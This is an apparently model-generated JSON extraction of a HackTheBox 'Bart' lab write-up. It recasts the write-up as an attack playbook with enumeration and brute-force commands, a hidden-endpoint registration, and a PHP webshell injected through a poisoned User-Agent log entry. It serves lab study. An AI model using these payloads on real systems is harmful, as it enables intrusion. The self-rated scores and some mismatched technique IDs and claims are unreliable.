@@ -1,0 +1,992 @@
+{
+  "writeup_id": "Htb_Bart",
+  "scenario_fingerprint": {
+    "scenario_name": "windows_iis_web_application_enumeration",
+    "primary_services": [
+      "http",
+      "iis"
+    ],
+    "port_signature": "80",
+    "service_combination": "iis+web_application",
+    "os_family": "windows_server",
+    "environment_type": "web_application",
+    "entry_vector": "web_enumeration_and_bypass",
+    "privilege_path": "web_shell_to_system",
+    "attack_complexity": "medium",
+    "estimated_time": "2-3 hours",
+    "scenario_confidence": 0.88,
+    "distinguishing_factors": [
+      "single_port_exposure",
+      "multiple_virtual_hosts",
+      "static_site_with_hidden_functionality",
+      "email_enumeration_via_forgot_password"
+    ],
+    "environmental_clues": [
+      "iis_10_server",
+      "virtual_host_redirects",
+      "wildcard_responses",
+      "wordpress_appearance_but_static"
+    ],
+    "similar_scenarios": [
+      "single_web_service_boxes",
+      "virtual_host_enumeration"
+    ],
+    "unique_aspects": [
+      "forum_and_monitor_subdomains",
+      "user_enumeration_via_password_reset",
+      "static_site_masquerading_as_wordpress"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "subdomain_enumeration",
+        "success_reason": "Directory brute forcing revealed monitor subdomain with different application",
+        "prerequisite_indicators": [
+          "wildcard_responses_present",
+          "multiple_applications_hosted",
+          "iis_server_detected"
+        ],
+        "recognition_patterns": [
+          "301 redirects in directory enumeration",
+          "different response codes/lengths",
+          "subdomain references in source code"
+        ],
+        "failure_modes": [
+          "no_additional_subdomains",
+          "same_application_everywhere",
+          "proper_access_controls"
+        ],
+        "environmental_factors": [
+          "multiple_applications_on_same_server",
+          "insufficient_network_segmentation",
+          "development_environments_exposed"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "15-30 minutes"
+      },
+      {
+        "technique": "username_enumeration",
+        "success_reason": "Forgot password functionality revealed valid usernames through error messages",
+        "prerequisite_indicators": [
+          "forgot_password_feature_exists",
+          "different_error_messages",
+          "user_enumeration_possible"
+        ],
+        "recognition_patterns": [
+          "different responses for valid/invalid users",
+          "timing differences in responses",
+          "verbose error messages"
+        ],
+        "failure_modes": [
+          "consistent_error_messages",
+          "rate_limiting_implemented",
+          "no_forgot_password_feature"
+        ],
+        "environmental_factors": [
+          "poor_application_security_design",
+          "insufficient_input_validation",
+          "verbose_error_handling"
+        ],
+        "success_probability": 0.82,
+        "typical_timeframe": "10-20 minutes"
+      },
+      {
+        "technique": "password_brute_force",
+        "success_reason": "Weak password policy allowed common password 'potter' for user harvey",
+        "prerequisite_indicators": [
+          "valid_username_identified",
+          "no_account_lockout",
+          "csrf_tokens_bypassable"
+        ],
+        "recognition_patterns": [
+          "weak password patterns",
+          "username-based passwords",
+          "no rate limiting"
+        ],
+        "failure_modes": [
+          "strong_password_policy",
+          "account_lockout_enabled",
+          "multi_factor_authentication"
+        ],
+        "environmental_factors": [
+          "default_password_policies",
+          "user_education_lacking",
+          "insufficient_security_controls"
+        ],
+        "success_probability": 0.68,
+        "typical_timeframe": "20-45 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "monitor.bart.htb subdomain",
+        "discovery_method": "wfuzz directory enumeration with response filtering",
+        "why_critical": "Revealed different application with authentication bypass opportunity",
+        "how_to_recognize": [
+          "301 redirects in directory scans",
+          "different response lengths",
+          "subdomain naming patterns"
+        ],
+        "follow_up_actions": [
+          "enumerate_new_application",
+          "test_authentication_mechanisms",
+          "look_for_information_disclosure"
+        ]
+      },
+      {
+        "discovery": "harvey potter username",
+        "discovery_method": "forgot password enumeration with employee names from main site",
+        "why_critical": "Valid account for authentication bypass",
+        "how_to_recognize": [
+          "commented out users in source code",
+          "employee information on company sites",
+          "different error messages"
+        ],
+        "follow_up_actions": [
+          "attempt_password_brute_force",
+          "test_common_passwords",
+          "check_for_default_credentials"
+        ]
+      },
+      {
+        "discovery": "internal-01.bart.htb subdomain reference",
+        "discovery_method": "authenticated access to monitor application",
+        "why_critical": "Additional attack surface for lateral movement",
+        "how_to_recognize": [
+          "internal subdomain naming",
+          "references in authenticated areas",
+          "development environment indicators"
+        ],
+        "follow_up_actions": [
+          "enumerate_internal_application",
+          "test_for_file_upload",
+          "look_for_lfi_vulnerabilities"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "unauthenticated",
+        "escalation_method": "subdomain_discovery_to_authentication",
+        "why_possible": "Multiple applications with different security postures on same server",
+        "recognition_signs": [
+          "directory_enumeration_reveals_subdomains",
+          "different_applications_per_subdomain",
+          "varying_security_implementations"
+        ],
+        "exploitation_path": "Directory Enum → Subdomain Discovery → Username Enum → Password Brute Force → Authenticated Access"
+      },
+      {
+        "privilege_level": "authenticated_user",
+        "escalation_method": "information_disclosure_to_lateral_movement",
+        "why_possible": "Authenticated areas revealed additional internal infrastructure",
+        "recognition_signs": [
+          "internal_subdomain_references",
+          "development_environment_exposure",
+          "insufficient_network_segmentation"
+        ],
+        "exploitation_path": "Authenticated Access → Information Disclosure → Internal Subdomain → File Upload/LFI → Shell Access"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Only port 80 open on Windows host with IIS 10.0",
+        "decision": "Focus on web application enumeration and subdomain discovery",
+        "reasoning": "Limited attack surface requires thorough web enumeration",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "port_scan_udp",
+            "when": "if web enum fails"
+          },
+          {
+            "option": "check_common_alt_ports",
+            "when": "if standard web fails"
+          }
+        ],
+        "success_indicators": [
+          "redirect_to_subdomain_found",
+          "multiple_vhosts_discovered",
+          "different_applications_identified"
+        ],
+        "next_decision": "enumerate_all_discovered_subdomains"
+      },
+      {
+        "step": 2,
+        "situation": "Multiple subdomains discovered (forum.bart.htb, monitor.bart.htb)",
+        "decision": "Enumerate each subdomain separately for different applications",
+        "reasoning": "Different subdomains likely host different applications with varying attack surfaces",
+        "confidence": 0.85,
+        "prerequisites": [
+          "subdomains_added_to_hosts_file"
+        ],
+        "success_indicators": [
+          "login_pages_found",
+          "user_information_discovered",
+          "application_types_identified"
+        ],
+        "failure_fallbacks": [
+          "directory_bruteforce",
+          "parameter_fuzzing"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Found login page with forgot password functionality",
+        "decision": "Use forgot password feature for username enumeration",
+        "reasoning": "Error messages can reveal valid usernames without authentication",
+        "confidence": 0.8,
+        "prerequisites": [
+          "potential_usernames_from_content"
+        ],
+        "success_indicators": [
+          "valid_username_confirmed"
+        ],
+        "next_decision": "attempt_password_attacks"
+      },
+      {
+        "step": 4,
+        "situation": "Valid username discovered, need password",
+        "decision": "Generate custom wordlist from site content using cewl",
+        "reasoning": "Site-specific passwords more likely than generic wordlists",
+        "confidence": 0.75,
+        "alternatives": [
+          {
+            "option": "common_passwords",
+            "when": "if custom wordlist fails"
+          },
+          {
+            "option": "credential_stuffing",
+            "when": "if multiple usernames found"
+          }
+        ],
+        "success_indicators": [
+          "successful_authentication"
+        ],
+        "next_decision": "explore_authenticated_functionality"
+      },
+      {
+        "step": 5,
+        "situation": "Authenticated access reveals additional internal subdomain",
+        "decision": "Investigate newly discovered internal subdomain",
+        "reasoning": "Internal systems often have weaker security controls",
+        "confidence": 0.9,
+        "prerequisites": [
+          "authenticated_session_established"
+        ],
+        "success_indicators": [
+          "new_application_accessible",
+          "different_login_system_found"
+        ],
+        "next_decision": "analyze_internal_application_security"
+      },
+      {
+        "step": 6,
+        "situation": "Internal application with removed registration but register.php still accessible",
+        "decision": "Attempt direct registration via POST to register.php",
+        "reasoning": "Backend functionality often remains even when frontend is removed",
+        "confidence": 0.7,
+        "alternatives": [
+          {
+            "option": "sql_injection_login_bypass",
+            "when": "if registration fails"
+          },
+          {
+            "option": "source_code_analysis",
+            "when": "if application_identified"
+          }
+        ],
+        "success_indicators": [
+          "account_created_successfully",
+          "access_to_internal_chat"
+        ],
+        "next_decision": "look_for_file_upload_or_injection_points"
+      }
+    ],
+    "branching_logic": {
+      "if_single_port_open": {
+        "action": "intensive_web_enumeration",
+        "tools": [
+          "gobuster",
+          "wfuzz",
+          "cewl"
+        ],
+        "focus": "subdomain_and_directory_discovery"
+      },
+      "if_multiple_subdomains_found": {
+        "action": "enumerate_each_separately",
+        "purpose": "identify_different_applications_and_attack_vectors",
+        "tools": [
+          "gobuster_per_subdomain",
+          "manual_inspection"
+        ]
+      },
+      "if_forgot_password_exists": {
+        "action": "username_enumeration",
+        "method": "error_message_analysis",
+        "wordlist_source": "site_content_and_employee_names"
+      },
+      "if_username_found": {
+        "action": "custom_password_attack",
+        "tools": [
+          "cewl",
+          "custom_bruteforcer"
+        ],
+        "approach": "site_specific_wordlist_generation"
+      },
+      "if_internal_subdomain_discovered": {
+        "action": "investigate_internal_application",
+        "focus": "relaxed_security_controls",
+        "techniques": [
+          "direct_endpoint_access",
+          "missing_frontend_controls"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_check_removed_frontend_endpoints",
+        "reasoning": "backend_functionality_often_remains_accessible",
+        "applicability": "web_applications_with_missing_links"
+      },
+      {
+        "rule": "use_cewl_for_custom_wordlists_on_limited_targets",
+        "reasoning": "site_specific_passwords_more_effective_than_generic",
+        "applicability": "single_web_application_targets"
+      },
+      {
+        "rule": "enumerate_all_discovered_subdomains_thoroughly",
+        "reasoning": "different_applications_provide_different_attack_vectors",
+        "applicability": "multi_subdomain_environments"
+      },
+      {
+        "rule": "leverage_forgot_password_for_username_enum",
+        "reasoning": "common_information_disclosure_vector",
+        "applicability": "login_pages_with_password_reset"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "Virtual Host Enumeration",
+        "mitre_id": "T1590.005",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "web_server_with_vhosts",
+          "dns_redirect_or_host_header_routing",
+          "multiple_subdomains_configured"
+        ],
+        "success_indicators": [
+          "redirect_to_different_hostname",
+          "host_header_accepted",
+          "different_content_per_vhost"
+        ],
+        "incompatible_with": [
+          "single_site_configuration",
+          "strict_host_header_validation",
+          "cdn_proxy_blocking"
+        ],
+        "confidence_boosters": [
+          "redirect_contains_subdomain",
+          "iis_server_detected",
+          "corporate_naming_patterns"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "10-30 minutes"
+      },
+      {
+        "technique": "Directory Bruteforce with Response Filtering",
+        "mitre_id": "T1083",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "web_server_accessible",
+          "wildcard_responses_present",
+          "consistent_error_page_size"
+        ],
+        "success_indicators": [
+          "different_response_lengths",
+          "status_code_variations",
+          "redirect_responses"
+        ],
+        "incompatible_with": [
+          "rate_limiting_enabled",
+          "waf_protection",
+          "dynamic_error_pages"
+        ],
+        "confidence_boosters": [
+          "static_error_page_size",
+          "predictable_redirect_patterns",
+          "iis_server_headers"
+        ],
+        "typical_success_rate": 0.82,
+        "estimated_time": "15-45 minutes"
+      },
+      {
+        "technique": "Username Enumeration via Forgot Password",
+        "mitre_id": "T1087.001",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "forgot_password_functionality",
+          "different_responses_for_valid_invalid_users",
+          "web_application_with_authentication"
+        ],
+        "success_indicators": [
+          "error_message_differences",
+          "response_time_variations",
+          "status_code_differences"
+        ],
+        "incompatible_with": [
+          "consistent_error_messages",
+          "rate_limiting_on_forgot_password",
+          "captcha_protection"
+        ],
+        "confidence_boosters": [
+          "corporate_email_patterns",
+          "employee_information_disclosed",
+          "predictable_username_formats"
+        ],
+        "typical_success_rate": 0.68,
+        "estimated_time": "5-20 minutes"
+      },
+      {
+        "technique": "File Upload with LFI Webshell",
+        "mitre_id": "T1105",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "file_upload_functionality",
+          "insufficient_file_validation",
+          "local_file_inclusion_vulnerability"
+        ],
+        "success_indicators": [
+          "file_upload_successful",
+          "uploaded_file_accessible",
+          "code_execution_achieved"
+        ],
+        "incompatible_with": [
+          "strict_file_type_validation",
+          "file_content_scanning",
+          "upload_directory_isolation"
+        ],
+        "confidence_boosters": [
+          "weak_file_extension_filtering",
+          "predictable_upload_paths",
+          "php_or_asp_server"
+        ],
+        "typical_success_rate": 0.45,
+        "estimated_time": "20-60 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "iis_web_server": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "banner_indicators": [
+          "Microsoft-IIS",
+          "IIS"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "virtual_host_environment": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http"
+        ],
+        "behavior_indicators": [
+          "redirect_to_hostname",
+          "host_header_routing"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "web_application_with_auth": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "feature_indicators": [
+          "login_form",
+          "forgot_password",
+          "authentication"
+        ],
+        "confidence_threshold": 0.8
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "virtual_host_enumeration",
+          "when": "redirect_to_hostname_detected",
+          "reason": "often_reveals_additional_attack_surface"
+        },
+        {
+          "attack": "username_enumeration",
+          "when": "forgot_password_found",
+          "reason": "provides_valid_usernames_for_further_attacks"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "directory_bruteforce_with_filtering",
+          "when": "wildcard_responses_detected",
+          "reason": "can_reveal_hidden_directories_despite_wildcards"
+        },
+        {
+          "attack": "file_upload_lfi",
+          "when": "upload_functionality_found",
+          "reason": "high_impact_but_requires_multiple_vulnerabilities"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "Virtual Host Discovery",
+        "mitre_id": "T1590.001",
+        "category": "reconnaissance",
+        "phase": "reconnaissance",
+        "tools_used": [
+          {
+            "name": "wfuzz",
+            "command_template": "wfuzz -c -w {wordlist} --hh {filter_size} http://{target}/FUZZ",
+            "actual_command": "wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hh 158607 http://bart.htb/FUZZ",
+            "output_pattern": "301 redirects to subdirectories",
+            "effectiveness_rating": 4,
+            "reliability": 0.85
+          },
+          {
+            "name": "gobuster",
+            "command_template": "gobuster -u http://{target} -w {wordlist} -x {extensions}",
+            "actual_command": "gobuster -u http://forum.bart.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,asp,aspx,html",
+            "success_factors": [
+              "proper_extension_enumeration",
+              "appropriate_wordlist"
+            ],
+            "effectiveness_rating": 3
+          }
+        ],
+        "prerequisites": [
+          "target_domain_identified",
+          "wildcard_response_handling"
+        ],
+        "success_indicators": [
+          "additional_subdomains_discovered",
+          "hidden_directories_found"
+        ],
+        "common_failures": [
+          "wildcard_dns_responses",
+          "insufficient_wordlists",
+          "missing_file_extensions"
+        ],
+        "follow_up_techniques": [
+          "subdomain_enumeration",
+          "content_discovery",
+          "credential_harvesting"
+        ],
+        "time_investment": "10-30 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Username Enumeration via Forgot Password",
+        "mitre_id": "T1087.001",
+        "category": "discovery",
+        "phase": "reconnaissance",
+        "tools_used": [
+          {
+            "name": "manual_testing",
+            "command_template": "curl -X POST http://{target}/forgot_password -d 'email={email}'",
+            "actual_command": "Manual testing via browser on monitor.bart.htb/?action=forgot",
+            "output_pattern": "Different responses for valid vs invalid emails",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          }
+        ],
+        "prerequisites": [
+          "forgot_password_functionality_exists",
+          "differential_responses_for_valid_invalid_users"
+        ],
+        "success_indicators": [
+          "valid_usernames_identified",
+          "different_error_messages_observed"
+        ],
+        "common_failures": [
+          "uniform_error_messages",
+          "rate_limiting_implemented"
+        ],
+        "follow_up_techniques": [
+          "password_brute_forcing",
+          "credential_stuffing"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Custom Brute Force with CSRF Token Handling",
+        "mitre_id": "T1110.001",
+        "category": "credential_access",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "custom_python_script",
+            "command_template": "python3 brute_monitor_login.py {wordlist}",
+            "actual_command": "python3 brute_monitor_login.py cewl-forum.txt",
+            "output_pattern": "[+] Found password: potter",
+            "effectiveness_rating": 4,
+            "reliability": 0.8
+          },
+          {
+            "name": "cewl",
+            "command_template": "cewl -w {output_file} -e -a http://{target}",
+            "actual_command": "cewl -w cewl-forum.txt -e -a http://forum.bart.htb",
+            "success_factors": [
+              "target_specific_wordlist",
+              "contextual_passwords"
+            ],
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "valid_username_identified",
+          "csrf_token_extraction_capability",
+          "session_management"
+        ],
+        "success_indicators": [
+          "successful_authentication",
+          "access_to_protected_resources"
+        ],
+        "common_failures": [
+          "account_lockout_mechanisms",
+          "rate_limiting",
+          "complex_csrf_implementation"
+        ],
+        "follow_up_techniques": [
+          "session_hijacking",
+          "privilege_escalation",
+          "lateral_movement"
+        ],
+        "time_investment": "30-60 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Log Poisoning via User-Agent",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "exploitation",
+        "tools_used": [
+          {
+            "name": "python_requests",
+            "command_template": "requests.get('http://{target}/log/log.php?filename={file}&username={user}', headers={'User-Agent':'{payload}'})",
+            "actual_command": "requests.get('http://internal-01.bart.htb/log/log.php?filename=0xdf.php&username=harvey', headers={'User-Agent':'0xdf: <?php system($_REQUEST[\"cmd\"]); ?>'})",
+            "output_pattern": "PHP code execution in log file",
+            "effectiveness_rating": 5,
+            "reliability": 0.9
+          },
+          {
+            "name": "curl",
+            "command_template": "curl -H 'User-Agent: {php_payload}' 'http://{target}/log/log.php?filename={file}&username={user}'",
+            "actual_command": "curl http://internal-01.bart.htb/log/0xdf.php?cmd=whoami",
+            "success_factors": [
+              "log_file_accessible_via_web",
+              "php_execution_enabled"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "log_functionality_identified",
+          "user_agent_logged_without_sanitization",
+          "log_files_web_accessible"
+        ],
+        "success_indicators": [
+          "php_code_execution_achieved",
+          "command_execution_confirmed",
+          "webshell_deployment_successful"
+        ],
+        "common_failures": [
+          "input_sanitization_present",
+          "log_files_not_web_accessible",
+          "php_execution_disabled"
+        ],
+        "follow_up_techniques": [
+          "reverse_shell_deployment",
+          "privilege_escalation",
+          "persistence_mechanisms"
+        ],
+        "time_investment": "15-30 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Account Registration Bypass",
+        "mitre_id": "T1078.001",
+        "category": "persistence",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "curl",
+            "command_template": "curl -X POST http://{target}/register.php -d 'uname={username}&passwd={password}'",
+            "actual_command": "curl -X POST http://internal-01.bart.htb/simple_chat/register.php -d 'uname=0xdf&passwd=password'",
+            "output_pattern": "Account creation successful",
+            "effectiveness_rating": 4,
+            "reliability": 0.85
+          }
+        ],
+        "prerequisites": [
+          "registration_endpoint_accessible",
+          "registration_form_removed_but_endpoint_active"
+        ],
+        "success_indicators": [
+          "account_created_successfully",
+          "authentication_with_new_account_works"
+        ],
+        "common_failures": [
+          "registration_endpoint_disabled",
+          "input_validation_prevents_registration"
+        ],
+        "follow_up_techniques": [
+          "application_enumeration",
+          "source_code_analysis"
+        ],
+        "time_investment": "5-10 minutes",
+        "skill_level": "beginner"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "wfuzz",
+        "use_case": "directory_enumeration_with_wildcard_filtering",
+        "effectiveness_rating": 4,
+        "reliability": 0.85,
+        "learning_curve": "medium",
+        "essential_for": [
+          "web_application_testing"
+        ],
+        "alternatives": [
+          "gobuster",
+          "ffuf",
+          "dirbuster"
+        ],
+        "best_practices": [
+          "use_response_size_filtering_for_wildcards",
+          "test_multiple_wordlists",
+          "include_common_file_extensions"
+        ]
+      },
+      {
+        "tool": "cewl",
+        "use_case": "target_specific_wordlist_generation",
+        "effectiveness_rating": 4,
+        "reliability": 0.8,
+        "learning_curve": "low",
+        "essential_for": [
+          "password_attacks"
+        ],
+        "alternatives": [
+          "manual_wordlist_creation",
+          "scraping_tools"
+        ],
+        "best_practices": [
+          "include_email_addresses_with_-e_flag",
+          "use_-a_flag_for_meta_data",
+          "combine_with_mutation_rules"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "web_app_enumeration_to_shell",
+        "steps": [
+          {
+            "step": 1,
+            "command": "wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hh 158607 http://bart.htb/FUZZ",
+            "purpose": "Discover hidden directories and subdomains",
+            "expected_output": "301 redirects to /monitor and /forum"
+          },
+          {
+            "step": 2,
+            "command": "Manual testing on monitor.bart.htb/?action=forgot with various email addresses",
+            "purpose": "Enumerate valid usernames",
+            "expected_output": "harvey@bart.htb identified as valid user"
+          },
+          {
+            "step": 3,
+            "command": "cewl -w cewl-forum.txt -e -a http://forum.bart.htb",
+            "purpose": "Generate target-specific wordlist",
+            "expected_output": "Wordlist with contextual terms"
+          },
+          {
+            "step": 4,
+            "command": "python3 brute_monitor_login.py cewl-forum.txt",
+            "purpose": "Brute force login with CSRF handling",
+            "expected_output": "Password 'potter' discovered"
+          },
+          {
+            "step": 5,
+            "command": "curl -X POST http://internal-01.bart.htb/simple_chat/register.php -d 'uname=0xdf&passwd=password'",
+            "purpose": "Create account on internal chat system",
+            "expected_output": "Account registration successful"
+          },
+          {
+            "step": 6,
+            "command": "requests.get with malicious User-Agent header to log.php",
+            "purpose": "Poison log file with PHP webshell",
+            "expected_output": "PHP code execution via log file"
+          }
+        ],
+        "success_rate": 0.75,
+        "typical_duration": "60-120 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Bart",
+      "difficulty": "Medium",
+      "os": "Windows",
+      "platform": "HackTheBox",
+      "release_date": "2018-02-24",
+      "author": "mrh4sh",
+      "estimated_time": "2-3 hours"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "medium",
+      "skill_level_required": "intermediate",
+      "primary_attack_vectors": [
+        "web_application",
+        "file_upload",
+        "local_file_inclusion"
+      ],
+      "key_vulnerabilities": [
+        "authentication_bypass",
+        "file_upload_bypass",
+        "lfi_to_webshell"
+      ],
+      "environment_type": "web_server_iis",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "web_enumeration",
+        "authentication_bypass",
+        "file_upload_attacks",
+        "lfi_exploitation"
+      ],
+      "prerequisite_knowledge": [
+        "web_application_testing",
+        "file_upload_techniques",
+        "windows_basics"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_application",
+      "subcategories": [
+        "file_upload",
+        "authentication_bypass",
+        "local_file_inclusion"
+      ],
+      "attack_types": [
+        "initial_access",
+        "privilege_escalation"
+      ],
+      "defensive_lessons": [
+        "secure_file_upload",
+        "proper_authentication",
+        "input_validation",
+        "file_extension_filtering"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Bounty",
+        "Devel",
+        "Optimum"
+      ],
+      "similarity_reasons": [
+        "windows_web_server",
+        "file_upload_exploitation",
+        "iis_environment"
+      ],
+      "unique_aspects": [
+        "multiple_site_enumeration",
+        "dual_authentication_bypass",
+        "lfi_webshell_combination"
+      ],
+      "difficulty_factors": [
+        "complex_enumeration_path",
+        "multiple_bypass_techniques",
+        "chained_vulnerabilities"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-05T03:32:44.327932",
+    "original_file": "0xdf_writeups/Htb Bart.md",
+    "content_length": 23763,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
